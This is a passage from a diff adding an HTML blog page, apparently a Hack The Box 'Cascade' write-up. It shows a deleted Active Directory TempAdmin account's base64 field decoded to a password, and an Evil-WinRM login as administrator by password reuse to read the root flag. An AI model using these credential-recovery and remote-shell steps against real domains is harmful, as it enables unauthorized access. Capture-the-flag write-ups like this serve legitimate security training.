+<span class="code-line">primaryGroupID                  : 513</span>
+<span class="code-line">ProtectedFromAccidentalDeletion : False</span>
+<span class="code-line">pwdLastSet                      : 132245689883479503</span>
+<span class="code-line">sAMAccountName                  : TempAdmin</span>
+<span class="code-line">sDRightsEffective               : 0</span>
+<span class="code-line">userAccountControl              : 66048</span>
+<span class="code-line">userPrincipalName               : TempAdmin@cascade.local</span>
+<span class="code-line">uSNChanged                      : 237705</span>
+<span class="code-line">uSNCreated                      : 237695</span>
+<span class="code-line">whenChanged                     : 1/27/2020 3:24:34 AM</span>
+<span class="code-line">whenCreated                     : 1/27/2020 3:23:08 AM</span>
+<span class="code-line"></code></pre></div>
+
+<p>We decode the base64 filed and found some password.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~$ echo -ne &#39;YmFDVDNyMWFOMDBkbGVz&#39; | base64 -d</span>
+<span class="code-line">baCT3r1aN00dles</span>
+<span class="code-line"></code></pre></div>
+
+<p>My first idea was to restore the object but it seems that this is not possible.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>*Evil-WinRM* PS C:\Users\arksvc\Documents&gt;  Get-ADObject -Filter &#39;samaccountname -eq &quot;TempAdmin&quot;&#39; -IncludeDeletedObjects | Restore-ADObject</span>
+<span class="code-line">Insufficient access rights to perform the operation</span>
+<span class="code-line">At line:1 char:81</span>
+<span class="code-line">+ ... ccountname -eq &quot;TempAdmin&quot;&#39; -IncludeDeletedObjects | Restore-ADObject</span>
+<span class="code-line">+                                                          ~~~~~~~~~~~~~~~~</span>
+<span class="code-line">    + CategoryInfo          : InvalidOperation: (CN=TempAdmin\0A...ascade,DC=local:ADObject) [Restore-ADObject], ADException</span>
+<span class="code-line">    + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject</span>
+<span class="code-line"></code></pre></div>
+
+<p>Therefore I just tried to connect as <code>administrator</code> hoping for password reuse,
+it worked and I was able to get the root flag..</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>kali@kali:~/tools/github/evil-winrm$ ruby ./evil-winrm.rb -i 10.10.10.182 -u administrator -pbaCT3r1aN00dles</span>
+<span class="code-line"></span>
+<span class="code-line">Evil-WinRM shell v1.8</span>
+<span class="code-line"></span>
+<span class="code-line">Info: Establishing connection to remote endpoint</span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/root.txt</span>
+<span class="code-line">86e93219a4f189663d558122a087a4c3</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="wrapping-up">Wrapping up</h2>
+<p>This box was fun as there was a lot of different stuff and everything went
+smoothly. The only painful part is the dig into the <code>ldapsearch</code> results as the
+file is quit long (6 363 lines).</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2020/07/htb-sauna.html"> HTB: Sauna </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2020/08/vulnhub-infosec-prep-oscp.html"> Vulnhub: InfoSec Prep: OSCP </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
